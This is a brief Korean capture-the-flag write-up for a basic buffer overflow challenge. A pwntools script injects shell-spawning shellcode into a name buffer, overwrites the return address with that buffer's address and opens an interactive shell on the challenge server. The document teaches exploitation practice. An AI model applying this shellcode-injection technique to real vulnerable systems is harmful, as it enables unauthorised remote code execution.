# 내 버퍼가 흘러넘친다!!!

기본적인 BOF 문제이다.   
name 변수에 shellcode를 넣어주고 return address를 name 변수의 주소로 덮어씌우면 된다.   
<br/>

```
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3003)

name = 0x804a060

context.arch = 'i386'
shellcode = shellcraft.sh()
shellcode = asm(shellcode)

payload = ''
payload += '\x90'*0x14
payload += '\x90'*4
payload += p32(name)

p.sendlineafter('Name : ', shellcode)
p.sendlineafter('input : ', payload)

p.interactive()
```
